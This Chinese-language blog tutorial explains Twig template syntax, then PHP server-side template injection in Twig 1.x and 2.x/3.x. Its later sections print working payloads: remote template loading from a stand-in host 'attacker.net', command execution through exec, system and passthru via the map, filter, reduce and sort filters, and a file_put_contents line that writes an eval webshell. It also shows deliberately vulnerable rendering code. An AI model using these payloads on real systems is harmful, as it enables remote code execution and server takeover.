---
title: PHP模板注入漏洞-Twig篇
description: 该文章详细记录了PHP Twig模板引擎的成因、利用方式和解析
date: 2025-03-03
image: cover.png
categories:
    - cate1
tags:
    - PHP
    - SSTI
    - Twig
---

## PHP常见模板引擎

> Twig 
>
> Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。
>
> Smarty 
>
> Smarty算是一种很老的PHP模板引擎了，非常的经典，使用的比较广泛。  
>
> Blade 
>
> Blade 是 Laravel 提供的一个既简单又强大的模板引擎。 
>
> 和其他流行的 PHP 模板引擎不一样，Blade 并不限制你在视图中使用原生PHP代码。所有Blade视图文件都将被编译成原生的PHP代码并缓存起来，除非它被修改，否则不会重新编译，这就意味着 Blade基本上不会给你的应用增加任何额外负担。

## 模板引擎payload格式

```smarty
Smarty 
{php}echo `id`;{/php} //在smarty 3.X中废弃 
{}
{literal} //PHP5中适用 
{if}{/if} 
```

```twig
Twig 
{{2*3}} 
```

```php
Blade 
{{}} 
{!! !!}
```

​	在PHP中如果使用了如上所述的模板引擎，在这些模板引擎之中分别利用不同的模板函数进行模板的渲染，如果函数中存在可控参数，那么很大概率会存在SSTI模板注入，下面我们通过介绍上述不同的模板引擎来引出引擎中的SSTI相关函数。

## Twig

### 简介

​	Twig是一款灵活、快速、安全的PHP模板引擎。如果你接触过其他基于文本的模板语言，比如 Smarty、Django、或者Jinja，你便能轻松掌握Twig。它坚持PHP的原则，并为模板环境添加了有用的功能，使其同时保持对设计师和开发者友好。

​	Twig由一个灵活的词法分析器和解析器驱动。这使得开发者可以自定义标签和过滤器，并创建自己的DSL。

​	Twig已被用于许多开源项目，比如Symfony, Drupal8, eZPublish,phpBB, Piwik, OroCRM；并且许多框架也支持它，例如Slim, Yii, Laravel, Codeigniter and Kohana。

### 基础语法

> 注意：该模块以下所有语句测试所用版本均为**Twig 1.16.1**。如若出现语法错误，则可能是版本兼容性问题

#### 变量

​	应用程序将变量传入模板中进行处理，变量可以包含你能访问的属性或元素。你可以使用 `.`来访问变量中的属性（方法或 PHP 对象的属性，或 PHP 数组单元），Twig还支持访问PHP数组上的项的特定语法， 其中对于`hada['gaga']`的访问示例如下：

```twig
{{ hada.gaga }}{{ hada['gaga'] }}
```

#### 全局变量

​	Twig模板中存在这些全局变量：

> _self：引用当前模板名称；（在twig1.x和2.x/3.x作用不一）
> _context：引用当前上下文；
> _charset：引用当前字符集。

#### 声明变量

​	为代码块内的变量赋值。赋值使用`set`标签：

```twig
{% set hada = 'gaga' %}
{% set hada = [1, 2] %}
{% set hada = {'hada': 'gaga'} %}
```

#### 过滤器

##### 作用

​	过滤器用于对变量内容进行格式化或修改操作，类似于管道处理（如：`{{ var|filter }}`），常用于：

> - 文本格式化（大小写转换、截断等）
> - 数据转换（日期格式化、JSON编码等）
> - 集合处理（排序、切片等）
> - 逻辑判断（默认值设置等）

##### 语法

```Twig
{# 基础用法 #}
{{ variable|filterName }}

{# 带参数用法 #}
{{ variable|filterName(arg1, arg2) }}

{# 链式调用 #}
{{ variable|filter1|filter2 }}
```

​	若要对代码部分应用筛选器，使用`apply`标签或者`filter`标签：

```twig
{% apply upper %}This text becomes uppercase{% endapply %}
{% filter upper %}This text becomes uppercase{% endfilter %}
```

​	其中`apply`标签在Twig **1.40 版本之前不存在**，而`filter`标签**兼容所有** Twig 1.x 版本

> 官方说明：`apply` 是 `filter` 的别名，二者功能完全一致，更新后建议优先使用 `apply` 以保持与 Twig 3.x 的兼容性

##### 示例

###### 日期格式化 (`date`)

```twig
{{ post.date|date('Y-m-d H:i:s') }}
{# 输出：2023-07-20 14:30:00 #}
```

###### 大小写转换

```twig
{{ 'Hello World'|lower }} {# 输出：hello world #}
{{ 'hello world'|upper }} {# 输出：HELLO WORLD #}
{{ 'hello world'|capitalize }} {# 输出：Hello World #}
```

###### 默认值 (`default`)

```twig
{{ user.name|default('Anonymous') }} 
{# 当user.name未定义时输出 Anonymous #}
```

###### 数组切片 (`slice`)

```twig
{{ [1,2,3,4,5]|slice(1, 3)|join(', ') }}
{# 输出：2, 3, 4（从索引1开始取3个元素）#}
```

#### 控制结构

​	控制结构是指所有控制程序流的代码，例如条件语句，循环语句以及条件+循环组合的代码块。控制结构使用{%%}。

##### 条件语句（`if`语句）：

###### 基础用法

```Twig
{% if temperature > 30 %}
    🥵 高温预警！
{% elseif temperature < 5 %}
    🥶 低温警报！
{% else %}
    🌤️ 天气舒适
{% endif %}
```

###### 复合条件

```twig
{% if user.isLoggedIn and user.role == 'admin' %}
    👑 欢迎管理员 {{ user.name }}
{% elseif user.isLoggedIn %}
    👋 欢迎回来 {{ user.name }}
{% else %}
    🔒 请先登录
{% endif %}
```

###### 空值校验

```twig
{% if comments is empty %}
    😞 还没有评论
{% endif %}
```

##### 循环控制 (`for` 循环)

###### 遍历数组

```twig
<ul>
{% for user in users %}
    <li>{{ loop.index }}. {{ user.name }}</li>
{% else %}
    <li>⚠️ 没有用户数据</li>
{% endfor %}
</ul>
```

> - `loop.index` 从1开始的计数
> - `loop.index0` 从0开始的计数
> - `loop.first` 是否是第一个元素
> - `loop.last` 是否是最后一个元素

###### 遍历关联数组

```twig
{% for key, value in settings %}
    {{ key }}: {{ value }}
{% endfor %}
```

###### 限定循环范围

```twig
{# 只显示前3条新闻 #}
{% for news in newsList|slice(0, 3) %}
    {{ news.title }}
{% endfor %}
```

##### 循环 + 条件组合

```twig
{% for product in products if product.stock > 0 %}
    ✅ {{ product.name }} (库存: {{ product.stock }})
{% else %}
    😥 所有商品已售罄
{% endfor %}
```

##### 完整示例

​	以下是一个完整的示例：

```twig
{# 模拟数据 #}
{% set users = [
    {name: '张三', role: 'user'},
    {name: '李四', role: 'admin'},
    {name: '王五', role: 'editor'}
] %}

{# 带条件的循环 #}
<ul>
{% for user in users %}
    <li>
        {{ loop.index }}. 
        {{ user.name|upper }}
        {% if user.role == 'admin' %}
            (管理员)
        {% endif %}
    </li>
{% endfor %}
</ul>
```

##### 特殊循环控制

```twig
{% for i in 0..10 %}
    {{ i }} {# 输出0到10 #}
{% endfor %}

{% for letter in 'a'..'z' %}
    {{ letter }} {# 输出a到z #}
{% endfor %}
```

#### 函数

​	在Twig中存在一些内置函数，如生成序列(`range`)，日期(`data`)。

##### 示例

```twig
{% for i in range(1, 5) %}
    {{ i }} {# 输出：1 2 3 4 5 #}
{% endfor %}

{% for letter in range('a', 'z') %}
    {{ letter }} {# 输出 a 到 z #}
{% endfor %}
```

#### 引入其他模板

​	Twig 提供的 `include`函数可以使你更方便地在模板中引入模板，并将该模板已渲染后的内容返回到当前模板

```twig
{{ include('other.html') }}
```

#### 继承

​	Twig最强大的部分是模板继承。模板继承允许您构建一个基本的“skeleton”模板，该模板包含站点的所有公共元素并定义子模版可以覆写的 blocks 块。

​	为便于理解，以下是一个基础模板继承（经典三明治结构）的示例：

##### 父模板`base.html.twig`

```twig
<!DOCTYPE html>
<html>
<head>
    <title>{% block title %}title{% endblock %}</title>
    {% block styles %}{% endblock %}
</head>
<body>
    {% block header %}
        <div class="header">head</div>
    {% endblock %}

    {% block content %}{% endblock %}

    {% block footer %}
        <div class="footer">© 2023 mywebsite</div>
    {% endblock %}
</body>
</html>
```

​	在这个例子中，`block` 标签定义了 5 个块，可以由子模版进行填充。对于模板引擎来说，所有的 `block` 标签都可以由子模版来覆写该部分。

##### 子模板`page.html.twig`

```twig
{% extends "base.html.twig" %}

{% block title %}about us - {{ parent() }}{% endblock %}

{% block styles %}
    {{ parent() }}
    <link rel="stylesheet" href="/css/about.css">
{% endblock %}

{% block content %}
    <h1>introduction</h1>
    <p>There is introduction about our company</p>
{% endblock %}
```

​	其中的 `extends` 标签是关键所在，其必须是模板的第一个标签。 `extends` 标签告诉模板引擎当前模板扩展自另一个父模板，当模板引擎评估编译这个模板时，首先会定位到父模板。

##### PHP脚本`page.php`

​	使用如下PHP脚本调用模板

```php
<?php
// 引入 Twig 自动加载器
require 'lib/Twig/Autoloader.php';
Twig_Autoloader::register();

// 修正点 1：使用正确的文件系统加载器类
$loader = new Twig_Loader_Filesystem(__DIR__ . '/templates');

// 修正点 2：使用完整类名实例化环境
$twig = new Twig_Environment($loader, [
    'auto_reload' => true // 开发模式建议开启
]);

// 渲染模板（确保 templates/page.html.twig 文件存在）
echo $twig->render('page.html.twig');
```

​	访问后渲染结果如下

![image-20250227113019832](/image-20250227113019832.png)

​	

### Twig 1.x

#### 安装

​	从https://github.com/twigphp/Twig/tree/v1.16.1中下载源码后解压到PHPstudy的WWW目录的同一级目录下，并创建一个网站让他解析，具体设置如下：

![image-20250226200703760](/image-20250226200703760.png)

#### 代码示例

​	在网站根目录下创建一个index.php文件，并键入如下内容：

```php
<?php 
// 引入 Twig 自动加载器
require_once 'lib/Twig/Autoloader.php';

// 注册 Twig 自动加载器
Twig_Autoloader::register();

// 创建基于内存的模板加载器（加载一个名为 'index' 的模板）
$loader = new Twig_Loader_Array(array( 
    'index' => 'Hello {{ name }}!', // 模板内容，使用 Twig 模板语法
));

// 创建 Twig 环境实例
$twig = new Twig_Environment($loader);

// 渲染 'index' 模板并传递变量
echo $twig->render('index', array('name'=>'World')); // 输出 "Hello World!"
```

​	随后访问http://twig1.localhost/test.php，你将看到**Hello World!**

​	Twig 模板注入也是发生在直接将用户输入作为模板，比如下面的代码：

```php
<?php 
// 引入 Twig 自动加载器
include 'lib/Twig/Autoloader.php';

// 注册 Twig 自动加载器
Twig_Autoloader::register();

// 创建字符串模板加载器（允许直接渲染字符串模板）
$loader = new Twig_Loader_String();

// 初始化 Twig 环境
$twig = new Twig_Environment($loader);

// 直接渲染来自 GET 参数 'name' 的模板内容
echo $twig->render($_GET['name']); // 动态执行用户输入的 Twig 模板代码
```

#### 	利用链解析

​	在 Twig 1.x 中存在三个全局变量：

> - `_self`：引用当前模板的实例。
> - `_context`：引用当前上下文。
> - `_charset`：引用当前字符集。

​	对应的代码在`Twig-1.16.1\lib\Twig\Node\Expression\Name.php`

```php
protected $specialVars = array(
        '_self'    => '$this',
        '_context' => '$context',
        '_charset' => '$this->env->getCharset()',
    );
```

​	当模板代码中使用 `_self` 变量时，它会返回当前的 `\Twig\Template` 实例。这个实例对象包含了一个指向 `Twig_Environment` 的 `env` 属性，我们可以通过它继续调用 `Twig_Environment` 中的其他方法。因此，通过在模板代码中使用 `_self` 变量和 `env` 属性，攻击者可以构造任意代码执行的攻击载荷，从而进行 SSTI 攻击。

​	例如该Payload 可以调用 `setCache` 方法改变 Twig 加载 PHP 文件的路径，在 `allow_url_include` 开启的情况下我们可以通过改变路径实现远程文件包含：

```twig
{{_self.env.setCache("ftp://attacker.net:21")}}{{_self.env.loadTemplate("backdoor")}}
```

​	我们在Twig-1.16.1\lib\Twig\Environment.php文件中还有 `getFilter` 方法：

```php
public function getFilter($name)
  {
    ...
    foreach ($this->filterCallbacks as $callback) {
    if (false !== $filter = call_user_func($callback, $name)) {
      return $filter;
    }
  }
  return false;
}
```

​	而在该方法中我们发现了危险函数`call_usr_func`通过传递参数到该函数中，我们可以调用任意 PHP 函数。因此有如下利用方法：

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("calc")}}
```

### Twig 2.x / 3.x

#### 安装

​	从https://github.com/twigphp/Twig/tree/v2.14.9中下载源码后解压到PHPstudy的WWW目录的同一级目录下，并创建一个网站让他解析，具体设置如下：

![image-20250303160849594](/image-20250303160849594.png)

#### 代码示例

​	在index.php中键入如下代码：

```php
<?php

require_once __DIR__ . '/vendor/autoload.php';

$loader = new \Twig\Loader\ArrayLoader();
$twig = new \Twig\Environment($loader);

$template = $twig->createTemplate("Hello {$_GET['name']}!");

echo $template->render();
```

​	访问如下链接：http://twig2.localhost/?name=world你将看到`Hello world!`

​	上述示例是一个存在模板注入漏洞的示例，到了 Twig 2.x / 3.x 版本中，`__self` 变量在 SSTI 中早已失去了他的作用，但我们可以借助新版本中的一些过滤器实现目的。

##### map过滤器

​	在 Twig 中，`map` 这个过滤器可以允许用户传递一个箭头函数，并将这个箭头函数应用于序列或映射的元素，示例模板文件如下：

###### `map.html.twig`

```twig
{% set people = [
    {first: "Bob", last: "Smith"},
    {first: "Alice", last: "Dupond"},
] %}

{{ people|map(p => "#{p.first} #{p.last}")|join(', ') }}
<br>

{% set people = {
    "Bob": "Smith",
    "Alice": "Dupond",
} %}

{{ people|map((last, first) => "#{first} #{last}")|join(', ') }}
```

​	使用如下PHP文件调用并渲染该模板：

###### `map.php`

```php
<?php
require_once __DIR__.'/vendor/autoload.php';

$loader = new \Twig\Loader\FilesystemLoader(__DIR__.'/templates');
$twig = new \Twig\Environment($loader);

// 渲染模板
$template = $twig->load('map.html.twig');
echo $template->render();
```

###### 目录结构

```
your_project/
├── templates/
│   └── map.html.twig
└── map.php
```

​	访问后你将得到输出：

```html
Bob Smith, Alice Dupond
Bob Smith, Alice Dupond
```

###### 利用解析

​	当我们如下使用 `map` 时：

```twig
{{["Mark"]|map((arg)=>"Hello #{arg}!")}}
```

​	Twig 会将其编译成：

```PHP
twig_array_map([0 => "Mark"], function ($__arg__) use ($context, $macros) { 
    $context["arg"] = $__arg__; return ("hello " . ($context["arg"] ?? null))
})
```

​	这个 `twig_array_map` 函数的源码如下：

```php
function twig_array_map($array, $arrow)
{
    $r = [];
    foreach ($array as $k => $v) {
        $r[$k] = $arrow($v, $k);    // 直接将 $arrow 当做函数执行
    }

    return $r;
}
```

​	关键部分

```php
$r[$k] = $arrow($v, $k);    	
```

​	从上面的代码我们可以看到，传入的 `$arrow` 直接就被当成函数执行，即 `$arrow($v, $k)`，而 `$v` 和 `$k` 分别是 `$array` 中的 value 和 key。`$array` 和 `$arrow` 都是我们我们可控的，那我们可以不传箭头函数，直接传一个可传入两个参数的、能够命令执行的危险函数名即可实现命令执行。通过查阅常见的命令执行函数：

```php
system ( string $command [, int &$return_var ] ) : string
passthru ( string $command [, int &$return_var ] )
exec ( string $command [, array &$output [, int &$return_var ]] ) : string
shell_exec ( string $cmd ) : string
```

​	前三个都可以使用。相应的 Payload 如下：

```twig
{{["calc"]|map("system")}}
{{["calc"]|map("passthru")}}
{{["calc"]|map("exec")}}    // 无回显
```

​	其中，`{{["calc"]|map("system")}}` 会被解析成下面这样：

```php
twig_array_map([0 => "calc"], "sysetm")
```

​	最终在 `twig_array_map` 函数中将执行 `system('calc',0)`。执行结果如下图所示：

![image-20250303163507917](/image-20250303163507917.png)

​	如果上面这些命令执行函数都被禁用了，我们还可以执行其他函数执行任意代码

```twig
{{["phpinfo();"]|map("eval")|join(",")}}
{{{"<?php phpinfo();eval($_POST['cmd'])":"web目录"}|map("file_put_contents")}}    // 写 Webshell
```

​	按照 `map` 的利用思路，我们去找带有 `$arrow` 参数的，可以发现下面几个过滤器也是可以利用的。

##### filer过滤器

​	这个 `filter` 过滤器使用箭头函数来过滤序列或映射中的元素。箭头函数用于接收序列或映射的值，示例模板如下：

###### `filter .html.twig`

```twig
{% set lists = [34, 36, 38, 40, 42] %}
{{ lists|filter(v => v > 38)|join(', ') }}
```

​	使用如下PHP脚本可调用该Twig模板：

###### `filter.php`

```php
<?php
require_once __DIR__.'/vendor/autoload.php';

$loader = new \Twig\Loader\FilesystemLoader(__DIR__.'/templates');
$twig = new \Twig\Environment($loader);

// 渲染模板
$template = $twig->load('filter .html.twig');
echo $template->render();
```

​	Twig将上述模板编译为如下结果：

```php
<?php echo implode(', ', array_filter($context["lists"], function ($__value__) { return ($__value__ > 38); })); ?>
```

###### 目录结构

```
your_project/
├── templates/
│   └── filter.html.twig
└── filter.php
```

​	访问后你将得到如下输出：

```html
40, 42
```

###### 利用解析

​	类似于 `map`，模板编译的过程中会进入 `twig_array_filter` 函数，这个 `twig_array_filter` 函数的源码如下：

```php
function twig_array_filter($array, $arrow)
{
    if (\is_array($array)) {
        return array_filter($array, $arrow, \ARRAY_FILTER_USE_BOTH);    // $array 和 $arrow 直接被 array_filter 函数调用
    }

    // the IteratorIterator wrapping is needed as some internal PHP classes are \Traversable but do not implement \Iterator
    return new \CallbackFilterIterator(new \IteratorIterator($array), $arrow);
}
```

​	根据源码可得，`$array` 和 `$arrow` 将作为参数直接传递给 `array_filter()` 函数。该函数可以使用回调函数过滤数组中的元素。如果我们自定义一个恶意的回调函数，可能会导致代码执行或命令执行等安全问题。

​	array_filter() 函数用回调函数过滤数组中的值。

```php
array_filter(array,callbackfunction);
```

|        参数        |             描述             |
| :----------------: | :--------------------------: |
|      *array*       |   必需。规定要过滤的数组。   |
| *callbackfunction* | 必需。规定要使用的回调函数。 |

​	array可以作为*callbackfunction*得参数来执行。

​	payload：

```twig
{{["calc"]|filter("system")}}
{{["calc"]|filter("passthru")}}
```

##### reduce 过滤器

​	`reduce` 过滤器使用箭头函数迭代地将序列或映射中的多个元素缩减为单个值。箭头函数接收上一次迭代的返回值和序列或映射的当前值，示例模板及PHP脚本如下：

###### `reduce.html.twig`

```twig
{% set numbers = [1, 2, 3] %}
{{ numbers|reduce((carry, v) => carry + v) }}
```

###### `reduce.php`

```php
<?php
require_once __DIR__.'/vendor/autoload.php';

$loader = new \Twig\Loader\FilesystemLoader(__DIR__.'/templates');
$twig = new \Twig\Environment($loader);

// 渲染模板
$template = $twig->load('reduce.html.twig');
echo $template->render();
```

​	编译结果

```php
<?php
echo twig_reduce_filter($this->env, $context["numbers"], function ($carry, $v) { return $carry + $v; });
?>
```

###### 目录结构

```
your_project/
├── templates/
│   └── reduce.html.twig
└── reduce.php
```

​	访问后你将得到如下输出：

```html
6
```

###### 利用解析

​	我们发现和map过滤器一样，同样将输入的变量引导了twig_reduce_filter中，下面是reduce中有关twig_reduce_filter函数的源码：

```php
function twig_reduce_filter($array, $arrow, $initial = null)
{
    if (!\is_array($array)) {
        $array = iterator_to_array($array);
    }

    return array_reduce($array, $arrow, $initial);    
}
```

​	$array, $arrow 和 $initial 直接被 array_reduce 函数调用`array_reduce` 函数可以发送数组中的值到用户自定义函数，并返回一个字符串。如果我们自定义一个危险函数，将造成代码执行或命令执行。

```php
{{[0, 0]|reduce("system", "calc")}}
```

##### sort 过滤器

作用，对数组进行排序，可以传递一个箭头函数来对数组进行排序，示例模板及PHP脚本如下：

###### `sort.html.twig`

```php
{% set fruits = [
    { name: 'Apples', quantity: 5 },
    { name: 'Oranges', quantity: 2 },
    { name: 'Grapes', quantity: 4 },
] %}

{% for fruit in fruits|sort((a, b) => a.quantity <=> b.quantity)|column('name') %}
    {{ fruit }}
{% endfor %}
```

###### `sort.php`

```php
<?php
require_once __DIR__.'/vendor/autoload.php';

$loader = new \Twig\Loader\FilesystemLoader(__DIR__.'/templates');
$twig = new \Twig\Environment($loader);

// 渲染模板
$template = $twig->load('sort.html.twig');
echo $template->render();
```

​	编译结果

```php
<?php
$context['_parent'] = $context;
$context['_seq'] = twig_ensure_traversable(twig_sort_filter($this->env, $context["fruits"], function ($a, $b) { return ($a["quantity"] <=> $b["quantity"]); }));
foreach ($context['_seq'] as $context["_key"] => $context["fruit"]) {
    // column()过滤器将返回值为$name的fruit['name']并输出
    echo twig_escape_filter($this->env, twig_get_attribute($this->env, $this->getSourceContext(), $context["fruit"], "name", [], "array", false, false, true, 13), "html", null, true);
}
```

###### 目录结构

```
your_project/
├── templates/
│   └── sort.html.twig
└── sort.php
```

###### 利用解析

​	我们可以注意到twig_sort_filter()这个函数

```php
twig_sort_filter($this->env, $context["fruits"], function ($a, $b) { return ($a["quantity"] <=> $b["quantity"]); })
```

​	下面是`sort`过滤器关于twig_sort_filter()函数的源码

```php
function twig_sort_filter($array, $arrow = null)
{
    if ($array instanceof \Traversable) {
        $array = iterator_to_array($array);
    } elseif (!\is_array($array)) {
        throw new RuntimeError(sprintf('The sort filter only works with arrays or "Traversable", got "%s".', \gettype($array)));
    }

    if (null !== $arrow) {
        uasort($array, $arrow);  
    } else {
        asort($array);
    }

    return $array;
}
```

​	漏洞部分

```php
 if (null !== $arrow) {
        uasort($array, $arrow);  
}
```

​	uasort() 函数使用用户自定义的比较函数对数组 $arr 中的元素按键值进行排序，在这段代码中，$array, $arrow这两个变量了同时可以使用用户自定义的比较函数对数组中的元素按键值进行排序，我们就可以传入包含函数参数的列表，进行命令执行了。

```php
{{["calc", 0]|sort("system")}}
```

## 参考文章

[文章 - Twig 模板注入从零到一 - 先知社区](https://xz.aliyun.com/news/9506)

[文章 - Twig模板引擎注入 - 先知社区](https://xz.aliyun.com/news/11762)

[奇安信攻防社区-Twig 模板引擎注入详解](https://forum.butian.net/share/2242)
